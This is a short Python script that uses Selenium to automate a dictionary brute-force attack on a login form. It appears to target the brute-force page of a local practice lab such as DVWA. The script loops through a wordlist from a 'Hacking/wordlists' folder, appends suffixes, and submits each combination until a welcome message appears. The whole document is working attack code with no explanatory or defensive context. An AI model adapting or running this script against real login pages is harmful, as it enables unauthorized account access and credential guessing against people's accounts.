from time import sleep
from selenium import webdriver
import threading

driver = webdriver.Chrome("C:\\Program Files (x86)\\chromedriver.exe")
driver.get("http://127.0.0.1/vulnerabilities/brute/")
input("")
driver.find_element_by_partial_link_text("Brute").click()
user, password, login, test_access = None, None, None, None
def get_access():
    global user, password, login, test_access
    try:
        test_access = driver.find_element_by_partial_link_text("Welcome to the password protected area")
        return True
    except:
        user = driver.find_element_by_name("username")
        password = driver.find_element_by_name("password")
        login = driver.find_element_by_name("Login")
        return False

file = open("Internet/Hacking/wordlists/common.txt")
passes = file.readlines()
file.close()

num_list = ['']
num_list.extend(passes[1:25])

for passText in passes:
    for num in num_list:
        if get_access(): break
        user.send_keys("1337")
        password.send_keys(passText[:-2] + num[:-2])
        login.click()
